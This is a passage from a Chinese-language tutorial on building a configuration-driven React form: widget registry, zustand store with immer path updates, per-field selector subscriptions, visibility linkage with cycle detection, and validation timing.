**是什么**：把 `type` 字符串映射到组件的注册表，加一个按 schema 递归渲染的组件。

**为什么需要**：渲染器要"解释执行"schema，它必须知道 `'select'` 对应哪个组件。注册表是这个翻译层的唯一字典——新增一种字段类型 = 注册一个 widget，渲染器一行不改。

**怎么做**：widget 组件的 props 契约先定死（后面所有 widget 都遵守它）：

```ts
// widgets/types.ts
import type { ReactElement } from 'react'
import type { FieldSchema } from '../types'

/** 所有输入组件统一遵守的 props 契约 */
export interface WidgetProps<T = unknown> {
  /** 字段完整路径，同时用作 label/htmlFor 关联与错误定位的 data-path */
  id: string
  schema: FieldSchema
  value: T
  disabled: boolean
  onChange: (value: T) => void
  onBlur: () => void
}

export type WidgetComponent = (props: WidgetProps<any>) => ReactElement
```

```ts
// widgets/registry.ts
import type { WidgetComponent } from './types'

/**
 * 注册表：type 字符串 → widget 组件。
 * 故意用 Record<string, ...> 而不是穷举映射——第 3 章会注册自定义 widget（如 options 编辑器），
 * 注册表必须是开放的，类型收窄交给调用处的 fallback UI 兜底。
 */
export const widgetRegistry: Record<string, WidgetComponent> = {
  input: InputWidget,
  textarea: TextareaWidget,
  number: NumberWidget,
  select: SelectWidget,
  switch: SwitchWidget,
  date: InputWidget, // 简化示例：date 先复用 input
}
```

两个最朴素的 widget，注意 `value` 的边界处理（这是坑 3 的第一道防线）：

```tsx
// widgets/InputWidget.tsx
import type { WidgetProps } from './types'

export function InputWidget({ id, schema, value, disabled, onChange, onBlur }: WidgetProps<string>) {
  return (
    <input
      id={id}
      className="widget-input"
      // 关键：value 永远是 string。undefined 会让 input 变非受控组件，触发 React 告警
      value={typeof value === 'string' ? value : value == null ? '' : String(value)}
      placeholder={schema.placeholder}
      disabled={disabled}
      onChange={(e) => onChange(e.target.value)}
      onBlur={onBlur}
    />
  )
}
```

```tsx
// widgets/SwitchWidget.tsx
import type { WidgetProps } from './types'

export function SwitchWidget({ id, value, disabled, onChange, onBlur }: WidgetProps<boolean>) {
  return (
    <input
      id={id}
      type="checkbox"
      className="widget-switch"
      checked={value === true}
      disabled={disabled}
      onChange={(e) => onChange(e.target.checked)}
      onBlur={onBlur}
    />
  )
}
```

递归渲染器（复用底座 1.3 的 `renderNode` 思路）在本章的形态是 `SchemaNode`：叶子字段交给 `Field`（步骤 4 详述），布局字段（group/grid/object）递归展开。骨架先立起来，布局细节在步骤 9 补全：

```tsx
// SchemaNode.tsx —— 路线骨架版，步骤 9 扩展布局分支
import { Field } from './Field'
import type { FieldSchema } from './types'

export function SchemaNode({ schema, path }: { schema: FieldSchema; path: string }) {
  // 叶子字段统一走 Field；Field 内部处理订阅、显隐、校验展示
  return <Field schema={schema} path={path} />
}
```

**常见坑（症状 → 根因 → 修法）**：症状——两个表单页字段 type 撞名（都用 `'input'` 但要不同样式）。根因——全局唯一注册表把"语义类型"和"实现组件"焊死了。修法——`createFormRenderer(registry)` 工厂按需生成渲染器，或注册表键加命名空间（`'antd.input'`）；本章保持单注册表，够用且简单。

#### 3. formData 管理：zustand 单 store，`setValue(path, value)` 用 immer 按路径更新

**是什么**：整个表单只有**一个** store 实例，持有 `formData / errors / touched / visibleMap / disabledMap`；所有更新走 `setValue(path, value)` 这类带路径的 action，用 immer 做不可变更新。

**为什么需要**：对比两种坏方案就明白了。方案 A"每字段一个 useState"：50 个字段 50 个 state，跨字段联动（改 A 要清 B）拿不到别的字段的值，提交时要挨个收集，FieldArray 更是没法做。方案 B"一个 useState({...formData})"：值都在一起了，但每次更新整棵 formData 换新引用，谁都不敢 fine-grained 订阅。单 store + 按路径更新是第三条路：**数据集中（联动、提交、回显都方便），更新精准（immer 结构共享让没动的子树保持原引用，订阅才有判重依据）**。

immer 的结构共享是后面 path 级订阅能成立的物理基础，这里必须讲透：对 `formData.company.name` 赋值时，immer 只复制路径上的对象（formData → company），`finance`、`users` 等兄弟子树全部保持**原引用**。于是"值没变的字段，selector 返回值的引用也没变"，zustand 用 `Object.is` 一比就跳过重渲染。

**怎么做**：先写两个路径工具（全章复用）：

```ts
// form/path.ts
import type { FormData } from '../types'

/** 按点路径读值：getPath(data, 'users.2.name')；任何一层缺失返回 undefined */
export function getPath(root: unknown, path: string): unknown {
  return path.split('.').reduce<unknown>((acc, key) => {
    if (acc != null && typeof acc === 'object') {
      return (acc as Record<string, unknown>)[key]
    }
    return undefined
  }, root)
}

/** 按点路径写值（配合 immer draft 使用）。中间层缺失时补空对象 */
export function setPath(root: FormData, path: string, value: unknown): void {
  const keys = path.split('.')
  const last = keys.pop()!
  let cur: Record<string, unknown> = root
  for (const k of keys) {
    const next = cur[k]
    // 中间层是 null/标量时补 {}，避免 'company.name' 在 company 未初始化时崩掉
    if (next == null || typeof next !== 'object') {
      cur[k] = {}
    }
    cur = cur[k] as Record<string, unknown>
  }
  cur[last] = value
}
```

store 的核心骨架（完整 action 在后续步骤逐步补齐；这里给出setValue 完整实现）：

```ts
// form/store.ts
import { create } from 'zustand'
import { produce } from 'immer'
import type { FormSchema, FormData, FieldSchema } from '../types'
import { getPath, setPath } from './path'

export interface FormStoreState {
  schema: FormSchema
  formData: FormData
  /** 键为字段完整路径，只在"确有错误"时存在该键 */
  errors: Record<string, string>
  /** 用户碰过（失焦过）的字段路径集合 */
  touched: Record<string, boolean>
  /** 显隐/禁用 map：只有声明了表达式的字段才会出现在 map 里 */
  visibleMap: Record<string, boolean>
  disabledMap: Record<string, boolean>
  submitAttempted: boolean
  setValue: (path: string, value: unknown) => void
  blur: (path: string) => void
  // validateField / validateAll / arrayPush / arrayRemove / arrayMove / submit 见步骤 6/7
}

export const createFormStore = (schema: FormSchema, initial?: FormData) =>
  create<FormStoreState>()((set, get) => {
    const initialData = normalizeInitialData(schema, initial)   // 见坑 3 小节，初始化必经
    return {
    schema,
    formData: initialData,
    errors: {},
    touched: {},
    // 装载时对初始数据先求一轮显隐/禁用（比如编辑回显时 userType 已是企业）
    visibleMap: evaluateLinkageMap(schema, initialData, 'visibleWhen'),
    disabledMap: evaluateLinkageMap(schema, initialData, 'disabledWhen'),
    submitAttempted: false,

    setValue: (path, value) =>
      set((s) =>
        produce(s, (draft) => {
          // ① 按路径写值：只有路径上的对象换新引用，其余子树保持原引用（结构共享）
          setPath(draft.formData, path, value)
          // ② 联动单轮重算：visibleMap/disabledMap + clearOnHide + 已触碰字段重校验
          //    实现见步骤 5，为什么"单轮"是循环依赖的解药也在步骤 5 展开
          applyLinkage(draft)
        }),
      ),
    blur: (path) =>
      set((s) =>
        produce(s, (draft) => {
          draft.touched[path] = true
          const field = findFieldByPath(draft.schema, path)
          if (field) {
            const msg = validateOne(field, getPath(draft.formData, path), draft.formData)
            if (msg) draft.errors[path] = msg
            else delete draft.errors[path]
          }
        }),
      ),
    }
  })
```

上面 `createFormStore` 的函数体是 `=> { const initialData = ...; return { ... } }` 形式：先用初始数据算好 `initialData`，再用它初始化 formData 并**求第一轮显隐/禁用**（编辑回显场景里 `userType` 可能一开始就是"企业"，公司字段的显隐必须在装载时就正确）。`evaluateLinkageMap` / `applyLinkage` / `validateOne` / `normalizeInitialData` / `findFieldByPath` 分别在步骤 5、6、9 展开，最终组装成完整文件。

为什么用 `produce(s, draft => ...)` 而不是 zustand 的 immer 中间件（`zustand/middleware/immer`）：两者等价，middleware 版写 `set((d) => { setPath(...) })` 更短，但显式 `produce` 把"一次 set = 一次原子更新"表达得更清楚——formData、errors、visibleMap 在同一次 produce 里一起变，不会出现"值更新了但显隐 map 还是旧的"的中间态。多字段一致性比省几个字符重要。

**常见坑（症状 → 根因 → 修法）**：症状——字段名里带点（如 `"tax.id"`），取值取到了嵌套对象。根因——点路径语法把 `.` 当分隔符，键名与路径语法冲突。修法——协议层面约束字段 `name` 只允许字母数字下划线；若真要支持，需引入转义语法（如 `['tax.id']`）并在 getPath/setPath 统一实现，代价是所有路径工具复杂化——除非硬需求，不建议。

#### 4. Field 组件模式：每个字段组件用 selector 只订阅自己的 `value` 和 `error`

这是本章的灵魂。先把反面教材摆出来，你会对"为什么需要 path 级订阅"有体感。

**反面代码：全量受控**。

```tsx
// ❌ 反面教材：父组件持有整个 formData，用 props 灌给所有字段
import { useState } from 'react'

function BadForm({ schema }: { schema: { fields: { name: string; label: string }[] } }) {
  const [formData, setFormData] = useState<Record<string, string>>({})
  return (
    <form>
      {schema.fields.map((f) => (
        <FieldBad
          key={f.name}
          schema={f}
          formData={formData}   // ← 灾难源头：每个字段都依赖整个 formData 对象
          onChange={(v) => setFormData({ ...formData, [f.name]: v })}
        />
      ))}
    </form>
  )
}

const FieldBad = ({ schema, formData, onChange }: any) => {
  const value = formData[schema.name] ?? ''
  return (
    <div className="field">
      <label>{schema.label}</label>
      <input value={value} onChange={(e) => onChange(e.target.value)} />
    </div>
  )
}
```

输入一个字符的完整灾难链：`setFormData` 生成新对象 → `BadForm` 重渲染 → 50 个 `FieldBad` 全部拿到新的 `formData` prop 引用 → 全部重渲染。50 个字段每键一键就是 50 次 render + 50 次 DOM diff，输入法连拼几个字母直接掉帧。更糟的是这不可救药——props 依赖的是"整个对象"，只要对象换引用，子组件无论如何都逃不掉，`memo` 也拦不住（props 真的变了）。

**修法的核心思路**：把"订阅"从父组件**下沉到叶子**，且每个叶子只订阅**自己的那一小块**。zustand 的 selector 机制正好提供这个能力：store 变化时，zustand 对每个订阅者跑一遍 selector，用 `Object.is` 比较新旧结果，只有结果变了才安排这个组件重渲染。配合 immer 结构共享（没变的子树引用不变），效果就是：改 `company.name`，只有 `company.name` 那个 Field 的 selector 返回值变了，其余 49 个字段全部静默。

**完整可运行链路**：store 定义 → selector（Context 分发 per-instance store）→ Field 组件 → 输入组件。

第 1 环，store 定义即步骤 3 的 `createFormStore`。为什么是工厂函数而不是模块级单例：一个页面可能同时存在两个表单（主表单 + 弹窗表单），第 3 章的属性面板更是"每次选中节点一个实例"。工厂 + Context 是标准搭配。

第 2 环，Context 分发 + 类型化 hook：

```tsx
// form/FormProvider.tsx
import { createContext, useContext, useState, type ReactNode } from 'react'
import type { StoreApi } from 'zustand'
import { createFormStore, type FormStoreState } from './store'
import type { FormSchema, FormData } from '../types'

type FormStoreApi = ReturnType<typeof createFormStore>

const FormStoreContext = createContext<FormStoreApi | null>(null)

export function FormProvider({
  schema,
  initial,
  children,
}: {
  schema: FormSchema
  initial?: FormData
  children: ReactNode
}) {
  // useState 惰性初始化：store 只建一次。schema 变化需要重建实例时，由外层用 key 控制
  const [store] = useState(() => {
    const s = createFormStore(schema, initial)
    return s
  })
  return <FormStoreContext.Provider value={store}>{children}</FormStoreContext.Provider>
}

/** 每个字段组件都通过它拿 store 并声明自己的 selector */
export function useFormStore<T>(selector: (s: FormStoreState) => T): T {
  const store = useContext(FormStoreContext)
  if (!store) throw new Error('useFormStore 必须在 <FormProvider> 内使用')
  return store(selector)
}
```

第 3 环，Field 组件——path 级订阅的落点：

```tsx
// form/Field.tsx
import { memo, useContext } from 'react'
import { FormStoreContext } from './FormProvider'
import { getPath } from './path'
import { widgetRegistry } from './widgets/registry'
import type { FieldSchema } from './types'

/**
 * Field：一个字段 = 一个订阅单元。
 * ① memo：父组件（分组/栅格容器）重渲染时，props（schema/path 引用稳定）没变就跳过
 * ② 全部 selector 只返回原始值：Object.is 一比即知变没变，不会因"每次返回新对象"误判
 */
export const Field = memo(function Field({ schema, path }: { schema: FieldSchema; path: string }) {
  const useStore = useContext(FormStoreContext)!
  // ↓↓↓ path 级订阅：每个字段只读自己路径下的四个值 + 两个 action
  const value = useStore((s) => getPath(s.formData, path))
  const error = useStore((s) => s.errors[path])
  const touched = useStore((s) => s.touched[path] === true)
  const visible = useStore((s) => s.visibleMap[path] ?? true)
  const disabled = useStore((s) => s.disabledMap[path] ?? false)
  const submitAttempted = useStore((s) => s.submitAttempted)
  const setValue = useStore((s) => s.setValue)   // action 引用在 store 创建时就固定，订阅永远稳定
  const blur = useStore((s) => s.blur)

  if (!visible) return null

  const Widget = widgetRegistry[schema.type]
  if (!Widget) {
    return <div className="field-unknown">未注册的字段类型：{String(schema.type)}</div>
  }

  const showError = (touched || submitAttempted) && !!error
  return (
    <div className={'field' + (showError ? ' field--invalid' : '')} data-path={path}>
      <label className="field-label" htmlFor={path}>
        {schema.label}
        {schema.required === true && <span className="field-required"> *</span>}
      </label>
      <Widget
        id={path}
        schema={schema}
        value={value}
        disabled={disabled}
        onChange={(v) => setValue(path, v)}
        onBlur={() => blur(path)}
      />
      {showError && (
        <div className="field-error" role="alert">
          {error}
        </div>
      )}
    </div>
  )
})
```

第 4 环，输入组件即步骤 2 的 `InputWidget` 等。四个环串起来：

```tsx
// 使用方式：四环链路的最小结exe
import { FormProvider } from './form/FormProvider'
import { SchemaNode } from './form/SchemaNode'
import type { FormSchema } from './types'

export function DynamicForm({ schema }: { schema: FormSchema }) {
  return (
    <FormProvider schema={schema}>
      <form className="dynamic-form">
        {schema.fields.map((f) => (
          <SchemaNode key={f.name} schema={f} path={f.name} />
        ))}
      </form>
    </FormProvider>
  )
}
```

数据流读一遍：用户在 `company.name` 输入 `值` → `InputWidget.onChange` → `setValue('company.name', '值')` → store 内 produce 更新 → zustand 通知全部订阅者 → 每个订阅者执行 selector → **只有** `company.name` 的 `getPath(s.formData, 'company.name')` 返回值变了 → 只有它重渲染。联动字段（visibleMap 依赖它的）是合理代价，其余字段纹丝不动。

**Profiler 观察法**（验证性能达标的科学方法，不是"感觉不卡"）：

1. 装 React DevTools 浏览器插件，打开你的表单页。
2. Profiler 面板 → 点录制（圆点）→ 在任意输入框打一个字符 → 停止录制。
3. 看火焰图：反面代码会看到 `BadForm` + 50 个 `FieldBad` 全部亮起（每次 commit 都算一次 render）；修复后只剩 1 个 `Field`。
4. 点某个重渲染的 `FieldBad`，右侧 "Why did this render?" 显示 "props changed: formData"——这就是根因证据链。
5. 打开 "Highlight updates when components render"，打字时页面上高亮闪烁的区域就是真实重渲染范围：反面代码整个表单闪，修复后只有当前输入框闪。

自动化场景（CI/测试）用 `React.Profiler` 编程接口数数：

```tsx
// __tests__/perf.tsx —— 计数每个字段的 commit 次数
import { Profiler } from 'react'

const renderCounts: Record<string, number> = {}

export function CountingField(props: { path: string; children: React.ReactNode }) {
  return (
    <Profiler
      id={props.path}
      onRender={(id) => {
        renderCounts[id] = (renderCounts[id] ?? 0) + 1
      }}
    >
      {props.children}
    </Profiler>
  )
}

// 断言：在 'finance.amount' 输入一个字符后
// expect(Object.keys(renderCounts).filter((p) => renderCounts[p] > 0)).toEqual(['finance.amount'])
```

三个容易破功的细节，全部要写进你的实现检查单：

| 泄漏点 | 症状 | 修法 |
|---|---|---|
| selector 返回新对象/数组 | 该字段每次 store 变化都重渲染（Object.is 恒 false） | selector 只返回原始值；非要对象用 `useShallow`（`zustand/react/shallow`） |
| 容器组件订阅了 formData | 分组/栅格容器整组重渲染 | 容器只渲染结构，不碰 formData；数据读取全部下沉到 Field |
| Field 没 memo | 容器因其他原因重渲染时把所有子 Field 带着重渲染 | `memo(Field)` + 保证 schema/path 这两个 props 引用稳定（schema 来自配置对象，天然稳定） |

```tsx
// selector 返回对象时的正确姿势（zustand v5 无默认浅比较，必须显式 useShallow）
import { useShallow } from 'zustand/react/shallow'

const { value, error } = useStore(
  useShallow((s) => ({ value: getPath(s.formData, path), error: s.errors[path] })),
)
// 本章 Field 用两个独立 selector 达到同样效果，且少一层比较，故不采用此写法
```

最后回答一个"为什么不用 Context 自己做"：Context 的 value 变化会让**所有消费组件**重渲染，没有 selector 层就没有"比一比再决定"的环节；React 官方 `use ContextSelector` 提案多年未落地。zustand 把订阅粒度做进库层，这就是选它的全部理由。

#### 5. 联动：`visibleWhen` 表达式求值显隐；想清楚"隐藏字段的值保留还是清空"

**是什么**：字段显隐（和禁用）由表达式驱动，表达式读表单数据求值，数据变 → 显隐跟着变。

**为什么需要**：联动是配置化表单的立身之本。"企业用户才显示公司信息字段"这种需求，手写要用 effect 监听再 setState，配置化之后是一行字符串 `"$form.userType == 'company'"`。但联动的难点从来不是"能不能动"，而是**求值时机**和**隐藏后的数据语义**——这两点不想清楚，上线就是 bug 单。

**怎么做（机制分步）**：

求值时机的完整管线——**每次 setValue 的同一次 produce 内，用新 formData 单轮重算全部表达式，产出新 visibleMap**：

```text
用户在"企业名称"输入一个字
   │
   ▼
setValue('companyName', '字')
   │ produce 内一次原子完成：
   ├─ ① formData 按路径写入（immer 结构共享）
   ├─ ② 用新 formData 重算所有 visibleWhen/disabledWhen → 新 visibleMap / disabledMap
   ├─ ③ diff 新旧 map：新隐藏 && clearOnHide → 值写回默认值，清 errors/touched
   └─ ④ touched / submitAttempted 的字段重校验 → 更新 errors
   │
   ▼
zustand 通知订阅者 → 每个 Field 跑 selector → Object.is 比对
   ├─ companyName 的 Field：value 变 → 重渲染（目标行为）
   ├─ 显隐依赖它的字段：visibleMap[x] 变 → 重渲染（合理代价）
   └─ 其余 48 个字段：selector 结果全没变 → 跳过
```

为什么求值放在 store action 里而不是放在 Field 的 `useEffect` 里：(a) 一致性——所有 Field 读同一份 visibleMap，不存在"有的字段算完了有的还没算"的撕裂帧；(b) 收敛性——联动计算是纯函数（formData 进、map 出），单轮执行无副作用，循环依赖天然被压住；(c) 性能——N 个表达式每键只算一轮，而不是每个字段各算各的。

三个函数构成联动引擎：

```ts
// form/linkage.ts
import { Parser } from 'expr-eval'
import type { FormSchema, FormData, FieldSchema, FormStoreState } from './types'
import { getPath, setPath } from './path'

const parser = new Parser()

/** 求值上下文：$form = 表单数据，$item = 数组行数据（仅行内字段用得到） */
export function evalExpr(expr: string, ctx: Record<string, unknown>): unknown {
  try {
    return parser.parse(expr).evaluate(ctx)
  } catch {
    // 表达式写错（引用了不存在的字段等）：返回 undefined 而不是抛错，
    // 否则一个字段的配置笔误会让整个表单输入瘫痪
    return undefined
  }
}

export function evalCondition(expr: string, formData: FormData, item?: unknown): boolean {
  const result = evalExpr(expr, { $form: formData, $item: item })
  return result === true
}

/** 遍历静态 schema 的叶子字段（group/grid/object 递归，array 视为叶子——行内字段动态求值） */
export function walkLeafFields(
  fields: FieldSchema[],
  prefix: string,
  cb: (field: FieldSchema, path: string) => void,
): void {
  for (const f of fields) {
    const path = prefix ? `${prefix}.${f.name}` : f.name
    if (f.type === 'group' || f.type === 'grid') {
      walkLeafFields(f.fields, prefix, cb)              // 布局节点不改路径前缀
    } else if (f.type === 'object') {
      walkLeafFields(f.fields, path, cb)
    } else {
      cb(f, path)                                        // input/select/array... 都是叶子
    }
  }
}

function evaluateLinkageMap(
  schema: FormSchema,
  formData: FormData,
  exprKey: 'visibleWhen' | 'disabledWhen',
): Record<string, boolean> {
  const map: Record<string, boolean> = {}
  walkLeafFields(schema.fields, '', (field, path) => {
    const expr = field[exprKey]
    if (typeof expr === 'string') {
      map[path] = evalCondition(expr, formData)
    }
    // 没写表达式的字段不进 map，Field 侧用 `?? true` / `?? false` 兜底
  })
  return map
}

/**
 * setValue 内的联动单轮重算。操作的是 produce 的 draft，全部改动合并进同一次 set。
 */
function applyLinkage(draft: FormStoreState): void {
  const nextVisible = evaluateLinkageMap(draft.schema, draft.formData, 'visibleWhen')

  // ③ clearOnHide：对"刚刚隐藏"的字段，值写回默认值（两种策略的差异见下文）
  for (const path of Object.keys(nextVisible)) {
    const wasVisible = draft.visibleMap[path] ?? true
    const nowVisible = nextVisible[path]
    if (wasVisible && !nowVisible) {
      const field = findFieldByPath(draft.schema, path)
      if (field?.clearOnHide) {
        setPath(draft.formData, path, field.default ?? blankOf(field.type))
        delete draft.errors[path]
        delete draft.touched[path]
      }
    }
  }

  draft.visibleMap = nextVisible
  draft.disabledMap = evaluateLinkageMap(draft.schema, draft.formData, 'disabledWhen')

  // ④ 已 touched 或 submitAttempted 的字段重校验：值变了/显隐变了，错误信息可能过时
  walkLeafFields(draft.schema.fields, '', (field, path) => {
    if (draft.touched[path] || draft.submitAttempted) {
      const msg = validateOne(field, getPath(draft.formData, path), draft.formData)
      if (msg) draft.errors[path] = msg
      else delete draft.errors[path]
    }
  })
}

export function findFieldByPath(schema: FormSchema, target: string): FieldSchema | undefined {
  let hit: FieldSchema | undefined
  walkLeafFields(schema.fields, '', (field, path) => {
    if (path === target) hit = field
  })
  return hit
}
```

Field 侧怎么消费 visibleMap——不需要任何新代码，步骤 4 的 `const visible = useStore((s) => s.visibleMap[path] ?? true)` 已经写好，显隐变化时只有 visibleMap 里那个字段的 Field 重渲染。**这就是"表达式求值时机 → visibleMap → path 订阅"三点连成一线**：表达式结果落到 map（store 里），map 变化精确通知到订阅该 path 的 Field。

**隐藏字段的值：保留 vs 清空**。这是产品语义决策，不是技术决策，但技术实现要同时支持两种，用 `clearOnHide` 开关。两种策略的代码差异只有上面 `applyLinkage` 中那一个 `if`，差异全在业务后果：

| | 保留（clearOnHide: false，默认） | 清空（clearOnHide: true） |
|---|---|---|
| 再显示时 | 用户之前填的还在（体验好） | 空白，要重填（体验差） |
| 提交数据 | 隐藏字段的值**混进提交数据** | 数据干净，隐藏 = 不存在 |
| 后端契约 | 后端必须容忍并忽略无关字段 | 契约严格，脏数据在源头消灭 |
| 适用 | 低危信息（备注、地址） | 敏感信息（身份证号）、强契约接口 |

具体业务例子：报销单"是否需要发票"开关关掉再打开，保留策略让用户填到一半的发票抬头不丢——这是体验刚需；但"身份证号"字段一旦因切换人员类型而隐藏，隐私合规要求它绝不能躺在提交数据里——必须清空。所以推荐组合拳：**默认保留 + 提交时按 visibleMap 过滤**，敏感字段显式标 `clearOnHide`：

```ts
// form/submitFilter.ts —— 保留策略下保证提交数据干净
import type { FormData } from '../types'
import { getPath, setPath } from './path'

/** 提交前：把当前不可见字段的值从数据里剥掉（当前隐藏 = 本次填写不包含它） */
export function filterByVisible(data: FormData, visibleMap: Record<string, boolean>): FormData {
  const out: FormData = structuredClone(data)
  for (const [path, visible] of Object.entries(visibleMap)) {
    if (!visible) {
      // 置 undefined 后 JSON.stringify 自然跳过；这里直接删键也可以
      setPath(out, path, undefined)
    }
  }
  return out
}
```

**联动循环依赖：复现与解法**。先复现一个真死循环——注意，罪魁祸首几乎总是"用 effect 把派生值写回 store"这个反模式：

```tsx
// ❌ 反面教材：a 的值由 b 派生，b 的值由 a 派生，effect 写回 → 死循环
function DerivedField({ pathA, pathB }: { pathA: string; pathB: string }) {
  const a = useFormStore((s) => getPath(s.formData, pathA))
  useEffect(() => {
    // b = a * 2，写成 effect 回写
    setValue(pathB, (Number(a) || 0) * 2)
  }, [a])
  return null
}
// 另一处对称地写着 a = b / 2 的 effect：
// a 变 → effect1 写 b → b 变 → effect2 写 a → ... 控制台刷
// "Maximum update depth exceeded"，字段值来回跳，页面卡死
```

表达式的静态环更隐蔽：`a.visibleWhen: "$form.b == 1"` 且 `b` 有 `clearOnHide`，b 的隐藏触发清值，b 的值又出现在 a 的表达式里……只要存在"值 → 显隐 → 值"的环，且写回动作存在，就可能振荡。

三层解法，层层递进：

1. **架构层（根治）**：派生数据永远不写回 store。显隐/禁用是"读时计算"的派生值（我们的 visibleMap 就是 formData 的纯函数），像 React 官方 "You Might Not Need an Effect" 说的那样在渲染/求值阶段算，而不是 effect 里 set。上面 DerivedField 的正确实现是展示时算 `Number(a) * 2`，或者显式做成"自动计算字段"由 setValue 统一触发。
2. **静态检测（提前暴露）**：加载 schema 时扫描所有表达式引用的 `$form.xxx` 路径建依赖图，找出环并拒绝加载：

```ts
// form/dependencyGraph.ts
/** 从表达式文本里提取 $form.xxx 引用：'$form.a.b > 1 && $form.c == 2' → ['a.b', 'c'] */
export function extractDeps(expr: string): string[] {
  const re = /\$form\.([A-Za-z0-9_.]+)/g
  return [...expr.matchAll(re)].map((m) => m[1])
}

/** schema 级环检测：显隐依赖成环直接报配置错误，而不是运行时振荡 */
export function assertNoDependencyCycle(schema: FormSchema): void {
  const graph = new Map<string, string[]>() // path → 它依赖的路径
  walkLeafFields(schema.fields, '', (field, path) => {
    const exprs = [field.visibleWhen, field.disabledWhen].filter(Boolean) as string[]
    graph.set(
      path,
      [...new Set(exprs.flatMap(extractDeps))].filter((dep) => dep !== path),
    )
  })
  // DFS 检测有向环（经典三色标记）
  const state = new Map<string, 1 | 2>() // 1=访问中 2=完成
  const stack: string[] = []
  const visit = (node: string): void => {
    const s = state.get(node)
    if (s === 1) throw new Error(`联动存在循环依赖：${[...stack, node].join(' → ')}`)
    if (s === 2) return
    state.set(node, 1)
    stack.push(node)
    for (const dep of graph.get(node) ?? []) if (graph.has(dep)) visit(dep)
    stack.pop()
    state.set(node, 2)
  }
  for (const node of graph.keys()) visit(node)
}
```

3. **运行时兜底（最后防线）**：`applyLinkage` 只跑单轮（本设计天然如此——重算 map 不触发新的 setValue），clearOnHide 的清值在**同一轮 produce** 内完成，第二轮求值时数据已收敛。若未来引入"清值再触发联动"的语义，给求值加轮数上限（如 5 轮，超限 console.error 并停止），这是表达式引擎的通用保护。

#### 6. 校验：required/正则/自定义函数，区分"失焦校验"与"提交校验"，维护 touched 状态

**是什么**：一套基于 rules 的校验函数 + 一套"何时触发"的时机策略 + 一个 touched 状态机。

**为什么需要**：校验逻辑本身简单（都是纯函数），难的是**时机**——边打字边报"格式不对"是体验灾难（用户还没打完就挨骂），只等提交才报又太迟钝。业界共识是三档时机：**失焦校验**（blur，我打完了，请检查）、**提交校验**（submit，全量兜底）、**变更校验**（change，只对"已经报过错"的字段做，报过错之后实时转正，这是体验关键）。touched 用来区分"没碰过"和"碰了但为空"。

**怎么做**：

先补齐自定义校验的注册表（呼应步骤 1：协议里只存键名）：

```ts
// form/validators.ts
import type { FormData } from '../types'

/** 自定义校验器：返回错误文案表示不通过，undefined 表示通过 */
export type CustomValidator = (value: unknown, formData: FormData) => string | undefined

export const validatorRegistry: Record<string, CustomValidator> = {
  phone: (v) => (/^1\d{10}$/.test(String(v)) ? undefined : '手机号格式不正确'),
  idCard: (v) => (/^\d{17}[\dXx]$/.test(String(v)) ? undefined : '身份证号格式不正确'),
  // 需要跨字段数据的校验也放这里：formData 全量在手
  greaterThanStartDate: (v, formData) =>
    v && formData.startDate && String(v) < String(formData.startDate)
      ? '结束时间不能早于开始时间'
      : undefined,
}
```

核心校验函数：

```ts
// form/validate.ts
import { validatorRegistry } from './validators'
import { getPath } from './path'
import type { FieldSchema, FormData } from '../types'

function isEmpty(v: unknown): boolean {
  return v === undefined || v === null || v === '' || (Array.isArray(v) && v.length === 0)
}

/** 单字段校验：优先级 required > pattern > 长度/范围 > custom */
export function validateOne(field: FieldSchema, value: unknown, formData: FormData): string | undefined {
  const r = field.rules ?? {}
  if (r.required && isEmpty(value)) {
    return r.requiredMessage ?? `${field.label}不能为空`
  }
  // 空值且非必填：不继续跑格式校验（空手机号不该报"格式不正确"）
  if (!isEmpty(value)) {
    if (r.pattern && !new RegExp(r.pattern).test(String(value))) {
      return r.patternMessage ?? `${field.label}格式不正确`
    }
    if (r.minLength != null && String(value).length < r.minLength) {
      return `${field.label}至少 ${r.minLength} 个字符`
    }
    if (r.maxLength != null && String(value).length > r.maxLength) {
      return `${field.label}最多 ${r.maxLength} 个字符`
    }
    if (r.custom) {
      const fn = validatorRegistry[r.custom]
      if (!fn) {
        console.error(`未注册的自定义校验器：${r.custom}`)
      } else {
        const msg = fn(value, formData)
        if (msg) return msg
      }
    }
  }
  return undefined
}
```

时机策略表（实现即步骤 3 `blur`、步骤 5 `applyLinkage` ④、下面 `validateAll` 三处）：

| 时机 | 做什么 | 不做什么 |
|---|---|---|
| onChange（setValue 内） | touched 或 submitAttempted 的字段重校验 | 没 touch 过的字段不校验（用户还在打字） |
| onBlur | 标记 touched + 立即校验该字段 | 不校验别的字段 |
| onSubmit | validateAll 全量校验、置 submitAttempted、聚焦第一个错误 | 不清空用户已填内容 |

提交相关的 store action 补全：

```ts
// form/store.ts 追加（拼进步骤 3 的 createFormStore）
import { produce } from 'immer'
import { walkLeafFields } from './linkage'
import { validateOne } from './validate'
import { filterByVisible } from './submitFilter'
import { transformSubmitData } from './transform'

// —— 在 createFormStore 的对象里追加：
  validateAll: () => {
    let firstErrorPath = ''
    set((s) =>
      produce(s, (draft) => {
        draft.errors = {}
        walkLeafFields(draft.schema.fields, '', (field, path) => {
          const msg = validateOne(field, getPath(draft.formData, path), draft.formData)
          if (msg) {
            draft.errors[path] = msg
            firstErrorPath ||= path   // 记录字典序遍历中第一个错误，用于聚焦
          }
        })
        draft.submitAttempted = true
      }),
    )
    if (firstErrorPath) {
      // data-path 是 Field 渲染时打上的锚点（见步骤 4），据此定位 DOM 聚焦
      const el = document.querySelector<HTMLElement>(
        `[data-path="${CSS.escape(firstErrorPath)}"]`,
      )
      el?.focus()
      el?.scrollIntoView({ block: 'center' })
      return false
    }
    return true
  },

  submit: () => {
    const ok = get().validateAll()
    if (!ok) return null
    const { formData, visibleMap } = get()
    // 提交数据 = 按 visibleMap 过滤 + 剥掉 _id 等内部键
    return transformSubmitData(filterByVisible(formData, visibleMap)) as FormData
  },
```

touched 状态机只有三条规则，别多加：**只在 blur 置位**（onChange 不置——打字不算"碰完"）；**reset 清空**；**校验展示条件 = `touched || submitAttempted`**（提交点过一次后，所有错误都该显示，字段随后实时重校验转正）。`submitAttempted` 一旦置位保持到下次成功提交或 reset，避免"提交报错→改好了→另一个错误不显示"的怪状态。

**常见坑（症状 → 根因 → 修法）**：症状——正则 `/^\d{11}$/` 配了 `pattern`，字段填了 11 位数字仍报格式错误。根因——`value` 是 number 类型（number 字段），`String(v)` 转换没错，但 schema 里正则写成了 `'\\d{11}'` 少了一层转义（JSON 里 `\d` 必须写 `\\d`，否则 JSON 解析后变成非法转义或直接变 `d`）。修法——写一个 schema 装载时的 `new RegExp(r.pattern)` 冒烟测试，非法正则在加载期报配置错误；文档里给出"JSON 正则速记：双反斜杠"。

